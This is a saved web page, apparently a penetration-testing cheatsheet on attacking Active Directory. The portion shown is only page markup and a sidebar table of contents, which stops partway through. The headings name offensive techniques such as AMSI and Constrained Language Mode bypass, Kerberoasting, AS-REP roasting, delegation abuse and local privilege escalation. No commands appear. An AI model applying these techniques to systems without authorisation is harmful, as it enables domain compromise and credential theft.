From: <Saved by Blink>
Snapshot-Content-Location: https://hideandsec.sh/books/cheatsheets-82c/page/active-directory
Subject: Active Directory | HideAndSec
Date: Wed, 5 Oct 2022 12:02:20 -0000
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----"


------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/html
Content-ID: <frame-14A15DAB240CDCD9D6E9EDAA41945795@mhtml.blink>
Content-Transfer-Encoding: binary
Content-Location: https://hideandsec.sh/books/cheatsheets-82c/page/active-directory

<!DOCTYPE html><html lang="en-GB" dir="ltr" class="tri-layout"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-717f78a7-f49d-4463-8d63-3e610c6a5689@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-544246fd-e1cf-4d4f-a16b-b85b9cdc8347@mhtml.blink" />
    <title>Active Directory | HideAndSec</title>

    <!-- Meta -->
    <meta name="viewport" content="width=device-width">
    <meta name="token" content="ZqH5RnzO5WqAVkTuoxIVFuz4Dm7LCVUvjwN9hxT8">
    <meta name="base-url" content="https://hideandsec.sh">
    

    <!-- Social Cards Meta -->
    <meta property="og:title" content="Active Directory | HideAndSec">
    <meta property="og:url" content="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory">
        <meta property="og:description" content="This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs,...">

    <!-- Styles and Fonts -->
    <link rel="stylesheet" href="https://hideandsec.sh/dist/styles.css?version=v21.08.3">
    <link rel="stylesheet" media="print" href="https://hideandsec.sh/dist/print-styles.css?version=v21.08.3">

    
    <!-- Custom Styles & Head Content -->
    
    <!-- Custom user content -->
<link rel="stylesheet" href="https://hideandsec.sh/css/dark-theme.css">

<link rel="stylesheet" href="https://hideandsec.sh/css/codemirror.css">


<!-- Matomo -->

<!-- End Matomo Code -->

<!-- Custom JS -->


<!-- End custom user content -->

    
    <!-- Translations for JS -->
    </head>
<body class="tri-layout">

        <div notification="success" style="display: grid;" data-autohide="" class="pos" role="alert">
    <svg class="svg-icon" data-icon="check-circle" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
</svg> <span></span><div class="dismiss"><svg class="svg-icon" data-icon="close" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg></div>
</div>

<div notification="warning" style="display: grid;" class="warning" role="alert">
    <svg class="svg-icon" data-icon="info" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 9h2V7h-2v2z"></path>
</svg> <span></span><div class="dismiss"><svg class="svg-icon" data-icon="close" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg></div>
</div>

<div notification="error" style="display: grid;" class="neg" role="alert">
    <svg class="svg-icon" data-icon="danger" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.73 3H8.27L3 8.27v7.46L8.27 21h7.46L21 15.73V8.27L15.73 3zM12 17.3c-.72 0-1.3-.58-1.3-1.3 0-.72.58-1.3 1.3-1.3.72 0 1.3.58 1.3 1.3 0 .72-.58 1.3-1.3 1.3zm1-4.3h-2V7h2v6z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg> <span></span><div class="dismiss"><svg class="svg-icon" data-icon="close" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg></div>
</div>
    <header id="header" component="header-mobile-toggle" class="primary-background">
    <div class="grid mx-l">

        <div>
            <a href="https://hideandsec.sh/" class="logo">
                                    <img class="logo-image" src="https://hideandsec.sh/uploads/images/system/2022-09/z4KDmyBtUP2wlHeh-logo-banner-try.png" alt="Logo">
                                            </a>
            <button type="button" refs="header-mobile-toggle@toggle" title="Expand Header Menu" aria-expanded="false" class="mobile-menu-toggle hide-over-l"><svg class="svg-icon" data-icon="more" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path>
</svg></button>
        </div>

        <div class="flex-container-row justify-center hide-under-l">
                        <form action="https://hideandsec.sh/search" method="GET" class="search-box" role="search">
                <button id="header-search-box-button" type="submit" aria-label="Search" tabindex="-1"><svg class="svg-icon" data-icon="search" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg> </button>
                <input id="header-search-box-input" type="text" name="term" aria-label="Search" placeholder="Search" value="">
            </form>
                    </div>

        <div class="text-right">
            <nav refs="header-mobile-toggle@menu" class="header-links">
                <div class="links text-center">
                                            <a class="hide-over-l" href="https://hideandsec.sh/search"><svg class="svg-icon" data-icon="search" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
    <path d="M0 0h24v24H0z" fill="none"></path>
</svg>Search</a>
                                                    <a href="https://hideandsec.sh/shelves"><svg class="svg-icon" data-icon="bookshelf" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"></path><path d="M1.088 2.566h17.42v17.42H1.088z" fill="none"></path><path d="M4 20.058h15.892V22H4z"></path><path d="M2.902 1.477h17.42v17.42H2.903z" fill="none"></path><g><path d="M6.658 3.643V18h-2.38V3.643zM11.326 3.643V18H8.947V3.643zM14.722 3.856l5.613 13.214-2.19.93-5.613-13.214z"></path></g></svg>Shelves</a>
                                                <a href="https://hideandsec.sh/books"><svg class="svg-icon" data-icon="books" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"></path><path d="M19.252 1.708H8.663a1.77 1.77 0 0 0-1.765 1.764v14.12c0 .97.794 1.764 1.765 1.764h10.59a1.77 1.77 0 0 0 1.764-1.765V3.472a1.77 1.77 0 0 0-1.765-1.764zM8.663 3.472h4.412v7.06L10.87 9.208l-2.206 1.324z"></path><path d="M30.61 3.203h24v24h-24z" fill="none"></path><path d="M2.966 6.61v14c0 1.1.9 2 2 2h14v-2h-14v-14z"></path></svg>Books</a>
                                                                    
                                                                    <a href="https://hideandsec.sh/login"><svg class="svg-icon" data-icon="login" role="presentation" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M21 3.01H3c-1.1 0-2 .9-2 2V9h2V4.99h18v14.03H3V15H1v4.01c0 1.1.9 1.98 2 1.98h18c1.1 0 2-.88 2-1.98v-14c0-1.11-.9-2-2-2zM11 16l4-4-4-4v3H1v2h10v3z"></path>
</svg>Log in</a>
                                    </div>
                            </nav>
        </div>

    </div>
</header>

    <div id="content" components="tri-layout" class="block">
        
    <div class="tri-layout-mobile-tabs print-hidden">
        <div class="grid half no-break no-gap">
            <button type="button" refs="tri-layout@tab" data-tab="info" aria-label="Tab: Show Secondary Information" class="tri-layout-mobile-tab px-m py-m text-primary" aria-selected="false">
                Info
            </button>
            <button type="button" refs="tri-layout@tab" data-tab="content" aria-label="Tab: Show Primary Content" aria-selected="true" class="tri-layout-mobile-tab px-m py-m text-primary active">
                Content
            </button>
        </div>
    </div>

    <div refs="tri-layout@container" class="tri-layout-container">

        <div class="tri-layout-left print-hidden pt-m" id="sidebar">
            <aside class="tri-layout-left-contents">
                
    
    
            <nav id="page-navigation" class="mb-xl" aria-label="Page Navigation">
            <h5>Page Navigation</h5>
            <div class="body">
                <div class="sidebar-page-nav menu">
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-misc" class="text-limit-lines-1 block">Misc</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-bypass-amsi" class="text-limit-lines-1 block">Bypass AMSI</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-create-powershell-cr" class="text-limit-lines-1 block">Create PowerShell credentials</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-decipher-secure-stri" class="text-limit-lines-1 block">Decipher Secure-String</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-execution-context-%2F-" class="text-limit-lines-1 block">Execution Context / AppLocker</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-applocker" class="text-limit-lines-1 block">AppLocker</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-bypass-constrained-l" class="text-limit-lines-1 block">Bypass Constrained Language Mode</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-port-forwarding" class="text-limit-lines-1 block">Port Forwarding</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-domain-enumeration" class="text-limit-lines-1 block">Domain Enumeration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-domain-objects" class="text-limit-lines-1 block">Domain Objects</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-current-domain" class="text-limit-lines-1 block">Current domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-another-domain" class="text-limit-lines-1 block">Another Domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-domain-controller" class="text-limit-lines-1 block">Domain controller</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-current-domain-0" class="text-limit-lines-1 block">Current domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-enumeration" class="text-limit-lines-1 block">Users enumeration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-list-users" class="text-limit-lines-1 block">List users</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-user%27s-properties" class="text-limit-lines-1 block">User's properties</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-search-for-a-particu" class="text-limit-lines-1 block">Search for a particular string in attributes</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-actively-logged-user" class="text-limit-lines-1 block">Actively logged users on a machine</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-locally-logged-users" class="text-limit-lines-1 block">Locally logged users on a machine</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-last-logged-user-on-" class="text-limit-lines-1 block">Last logged user on a machine</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-user-hunting" class="text-limit-lines-1 block">User hunting</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-find-machine-where-t" class="text-limit-lines-1 block">Find machine where the user has admin privs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-find-local-admins-on" class="text-limit-lines-1 block">Find local admins on the domain machines</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-find-machines-where-" class="text-limit-lines-1 block">Find machines where specific users or groups have sessions</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-check-local-admin-ac" class="text-limit-lines-1 block">Check local admin access for the current user where the targets are found</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-computers-enumeratio" class="text-limit-lines-1 block">Computers enumeration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-groups-enumeration" class="text-limit-lines-1 block">Groups enumeration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-groups-in-the-curren" class="text-limit-lines-1 block">Groups in the current domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-search-for-a-particu-0" class="text-limit-lines-1 block">Search for a particular string in attributes</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-all-users-in-a-speci" class="text-limit-lines-1 block">All users in a specific group</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-all-groups-of-an-use" class="text-limit-lines-1 block">All groups of an user</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-local-groups-enumera" class="text-limit-lines-1 block">Local groups enumeration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-members-of-local-gro" class="text-limit-lines-1 block">Members of local groups</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-shares-%2F-files" class="text-limit-lines-1 block">Shares / Files</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-find-shares-on-the-d" class="text-limit-lines-1 block">Find shares on the domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-sensitive-files-on-t" class="text-limit-lines-1 block">Sensitive files on the domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-find-all-fileservers" class="text-limit-lines-1 block">Find all fileservers of the domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-gpo-enumeration" class="text-limit-lines-1 block">GPO Enumeration</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-list-of-gpo-in-the-d" class="text-limit-lines-1 block">List of GPO in the domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-get-gpo-that-modify-" class="text-limit-lines-1 block">Get GPO that modify local group via Restricted Groups</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-which-are-in-a" class="text-limit-lines-1 block">Users which are in a local group of a machine using GPOs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-machine-where-an-use" class="text-limit-lines-1 block">Machine where an user is member of a local group using GPOs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-organisation-units" class="text-limit-lines-1 block">Organisation Units</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-ous-of-the-domain" class="text-limit-lines-1 block">OUs of the domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-computers-within-an-" class="text-limit-lines-1 block">Computers within an OU</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-gpo-applied-on-an-ou" class="text-limit-lines-1 block">GPO applied on an OU / Read GPO from the GP-Link attribut from Get-NetOU</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls" class="text-limit-lines-1 block">ACLs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-all-acls-associated-" class="text-limit-lines-1 block">All ACLs associated to an object (inbound)</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-outbound-acls-of-an-" class="text-limit-lines-1 block">Outbound ACLs of an object</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-acls-associated-to-a" class="text-limit-lines-1 block">ACLs associated to a specific path</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-trusts" class="text-limit-lines-1 block">Trusts</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-map-trusts" class="text-limit-lines-1 block">Map trusts</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-domain-trusts-for-th" class="text-limit-lines-1 block">Domain trusts for the current domain</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-forest" class="text-limit-lines-1 block">Forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-details-about-the-cu" class="text-limit-lines-1 block">Details about the current forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-all-domains-in-the-c" class="text-limit-lines-1 block">All domains in the current forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-global-catalogs-of-t" class="text-limit-lines-1 block">Global catalogs of the current forest</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-forest-trusts" class="text-limit-lines-1 block">Forest trusts</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-bloodhound-%2F-sharpho" class="text-limit-lines-1 block">BloodHound / SharpHound</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-basic-usage" class="text-limit-lines-1 block">Basic usage</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-stealth-usage" class="text-limit-lines-1 block">Stealth usage</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-loop-collection" class="text-limit-lines-1 block">Loop collection</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-from-a-non-domain-jo" class="text-limit-lines-1 block">From a non domain joined computer</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-interesting-neo4j-qu" class="text-limit-lines-1 block">Interesting Neo4j queries</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-with-spns" class="text-limit-lines-1 block">Users with SPNs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-as-rep-roastable-use" class="text-limit-lines-1 block">AS-REP Roastable users</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-computers-allowedtod" class="text-limit-lines-1 block">Computers AllowedToDelegate to other computers</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-shortest-path-from-k" class="text-limit-lines-1 block">Shortest path from Kerberoastable user</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-computers-in-unconst" class="text-limit-lines-1 block">Computers in Unconstrained Delegations</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-rights-against-gpos" class="text-limit-lines-1 block">Rights against GPOs</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-potential-sql-admins" class="text-limit-lines-1 block">Potential SQL Admins</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h3">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-laps" class="text-limit-lines-1 block">LAPS</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h1">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-local-privesc" class="text-limit-lines-1 block">Local Privesc</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-powerup" class="text-limit-lines-1 block">PowerUp</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-other-enumeration-to" class="text-limit-lines-1 block">Other enumeration tools</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-always-install-eleva" class="text-limit-lines-1 block">Always Install Elevated</a>
                            <div class="primary-background sidebar-page-nav-bullet"></div>
                        </li>
                                            <li class="page-nav-item h2">
                            <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-impersonation-attack" class="text-limit-lines-1 block">Impersonation attacks / Potatoes</a>
